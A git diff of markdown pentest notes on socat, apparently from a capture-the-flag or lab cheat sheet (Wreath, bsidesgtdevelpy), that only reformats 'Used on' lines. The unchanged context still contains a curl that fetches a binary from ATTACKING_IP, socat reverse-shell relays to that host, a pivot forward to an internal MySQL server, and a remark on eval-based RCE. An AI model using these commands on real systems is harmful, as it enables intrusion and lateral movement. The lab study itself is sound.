@@ -8,7 +8,9 @@ curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
 ./socat-USERNAME tcp-l:8000 tcp:ATTACKING_IP:443 &
 ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
 ```
-Used on: **Wreath** - documented reverse shell relays, local forwards, quiet outbound relays, and OpenSSL-wrapped forwards.
+Used on: **Wreath**
+
+documented reverse shell relays, local forwards, quiet outbound relays, and OpenSSL-wrapped forwards.
 
 "netcat on steroids". Bidirectional stream relay between any two endpoints — TCP, UDP, UNIX socket, file, PTY, OpenSSL, child process — with PTY allocation, fork-per-connection, EOF handling and SSL all built in. The Swiss-army knife for **stable** reverse shells, port forwarding, and lab-style "host this script on a TCP port" patterns.
 
@@ -46,7 +48,9 @@ socat - TCP:$TARGET:9999
 ```bash
 socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0
 ```
-Used on: **bsidesgtdevelpy** — this is what's serving the Python script on port 10000. The `EXEC:` clause re-spawns the script per connection. If the script `eval`s/`input()`s attacker bytes -> RCE. See [python-input-injection.md](../../exploits/web-rce/python-input-injection.md).
+Used on: **bsidesgtdevelpy**
+
+this is what's serving the Python script on port 10000. The `EXEC:` clause re-spawns the script per connection. If the script `eval`s/`input()`s attacker bytes -> RCE. See [python-input-injection.md](../../exploits/web-rce/python-input-injection.md).
 
 ### Local port forward (akin to `ssh -L`)
 ```bash
